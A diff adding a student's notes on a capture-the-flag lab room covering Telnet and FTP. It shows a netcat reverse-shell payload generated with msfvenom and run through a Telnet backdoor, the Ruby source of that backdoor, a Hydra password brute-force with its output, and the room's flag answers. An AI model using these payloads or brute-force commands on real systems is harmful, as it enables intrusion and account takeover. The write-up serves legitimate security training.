@@ -196,3 +196,202 @@ The attacking machine has a listening port, on which it receives the connection,
 ![](https://i.imgur.com/EUC7VS6.png)
 Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above. *No answer needed*
 ```text
+telnet 10.10.181.64 8012
+```
+Great! It's an open telnet connection! What welcome message do we receive? *SKIDY'S BACKDOOR.*
+Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N) *N*  (.HELP)
+Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.  *No answer needed*
+Start a tcpdump listener on your local machine.
+If using your own machine with the OpenVPN connection, use:
+sudo tcpdump ip proto \\icmp -i tun0
+If using the AttackBox, use:
+sudo tcpdump ip proto \\icmp -i eth0
+This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on. *No answer needed*
+```text
+sudo tcpdump ip proto \\icmp -i tun0
+```
+```text
+.RUN ping 10.18.1.77 -c 1
+```
+Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N) *Y*
+Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun! *No answer needed*
+We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:
+"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"
+-p = payload
+lhost = our local host IP address (this is your machine's IP address)
+lport = the port to listen on (this is the port on your machine)
+R = export the payload in raw format
+```text
+msfvenom -p cmd/unix/reverse_netcat lhost=10.18.1.77 lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 88 bytes
+mkfifo /tmp/xoof; nc 10.18.1.77 4444 0</tmp/xoof | /bin/sh >/tmp/xoof 2>&1; rm /tmp/xoof
+```
+What word does the generated payload start with? *mkfifo*
+Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
+"nc -lvp [listening port]"
+What would the command look like for the listening port we selected in our payload?
+*nc -lvp 4444*
+Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!
+`mkfifo /tmp/xoof; nc 10.18.1.77 4444 0</tmp/xoof | /bin/sh >/tmp/xoof 2>&1; rm /tmp/xoof`
+```kali machine
+nc -lvp 4444
+```
+```telnet
+.RUN mkfifo /tmp/xoof; nc 10.18.1.77 4444 0</tmp/xoof | /bin/sh >/tmp/xoof 2>&1; rm /tmp/xoof
+```
+> ┌──(kali㉿kali)-[~/Downloads/telnet_learning]
+└─$ nc -lvp 4444
+listening on [any] 4444 ...
+10.10.181.64: inverse host lookup failed: Unknown host
+connect to [10.18.1.77] from (UNKNOWN) [10.10.181.64] 53772
+whoami
+root
+ls
+flag.txt
+cat flag.txt
+**THM{y0u_g0t_th3_t3ln3t_fl4g}**
+```/home/optional
+require 'socket'
+
+server = TCPServer.new(8012)
+counter = 0
+begin
+  while connection = server.accept
+    connection.puts "SKIDY'S BACKDOOR. Type .HELP to view commands"
+     
+
+    while line = connection.gets
+      break if line =~ /EXIT/  
+      line.strip!
+      if line == '.HELP'
+        connection.puts ".HELP: View commands\n .RUN <command>: Execute commands\n.EXIT: Exit"
+      end
+      
+      if line =~ /.RUN/
+        cmd = line.split(" ")[1..line.length - 1].join(' ')
+        system(cmd)
+      end
+
+    end
+    connection.puts "Connection Closed\n"
+    connection.close
+
+  end
+rescue Errno::ECONNRESET, Errno::EPIPE => e
+  puts e.message
+  retry
+end
+```
+`.EXIT to close telnet`
+### Understanding FTP
+What is FTP?
+File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.
+How does FTP work?
+A typical FTP session operates using two channels:
+a command (sometimes called the control) channel
+a data channel.
+As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.
+FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.
+While the session is open, the client may execute FTP commands on the server.
+Active vs Passive
+The FTP server may support either Active or Passive connections, or both.
+In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.
+In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.
+This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.
+More Details:
+You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards.
+![|333](https://cdn4.iconfinder.com/data/icons/computer-technology-31/100/technology-14-512.png)
+What communications model does FTP use? *client-server*
+What's the standard FTP port? *21*
+How many modes of FTP connection are there?    *2*
+Types of FTP Exploit
+Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.
+![|222](https://webstockreview.net/images/lock-clipart-broken-lock-5.png)
+With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.
+When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.
+Method Breakdown
+So, from our enumeration stage, we know:
+- There is an FTP server running on this machine
+- We have a possible username
+Using this information, let's try and bruteforce the password of the FTP Server.
+Hydra
+Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.
+The syntax for the command we're going to use to find the passwords is this:
+"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"
+Let's break it down:
+SECTION             FUNCTION
+hydra                   Runs the hydra tool
+-t 4                    Number of parallel connections per target
+-l [user]               Points to the user who's account you're trying to compromise
+-P [path to dictionary] Points to the file containing the list of possible passwords
+-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+[machine IP]            The IP address of the target machine
+ftp / protocol          Sets the protocol
+Let's crack some passwords!
+```text
+hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.175.222 ftp
+```
+```text
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-19 13:16:59
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ftp://10.10.175.222:21/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.175.222 - login "mike" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.175.222 - login "mike" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.175.222 - login "mike" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.175.222 - login "mike" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[21][ftp] host: 10.10.175.222   login: mike   password: password
+[STATUS] attack finished for 10.10.175.222 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-19 13:17:15
+```
+What is the password for the user "mike"? *password*
+Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted  *No answer needed*
+```text
+┌──(kali㉿kali)-[~/Downloads/tcp_learning]
+└─$ ftp 10.10.175.222
+Connected to 10.10.175.222.
+220 Welcome to the administrator FTP service.
+Name (10.10.175.222:kali): mike
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||21705|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
+-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
+226 Directory send OK.
+ftp> more ftp.txt
+THM{y0u_g0t_th3_ftp_fl4g}
+```
+What is ftp.txt? ***THM{y0u_g0t_th3_ftp_fl4g}***
+### Expanding Your Knowledge
+Further Learning
+There is no checklist of things to learn until you've officially learnt everything you can. There will always be things that surprise us all, especially in the sometimes abstract logical problems of capture the flag challenges. But, as with anything, practice makes perfect. We can all look back on the things we've learnt after completing something challenging and I hope you feel the same about this room.
+Reading
+Here's some things that might be useful to read after completing this room, if it interests you:
+https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
+https://attack.mitre.org/techniques/T1210/
+https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
+Thank you
+Thanks for taking the time to work through this room, I wish you the best of luck in future.
+~ Polo
+Answer the questions below
+Well done, you did it! *No answer needed*
+
+## Flags / Answers
+- What is the smb.txt flag? ***THM{smb_is_fun_eh?}***
+- Success! What is the contents of flag.txt? ***THM{y0u_g0t_th3_t3ln3t_fl4g}***
+
+## Notes / Lessons Learned
+[[Security Operations]]
+
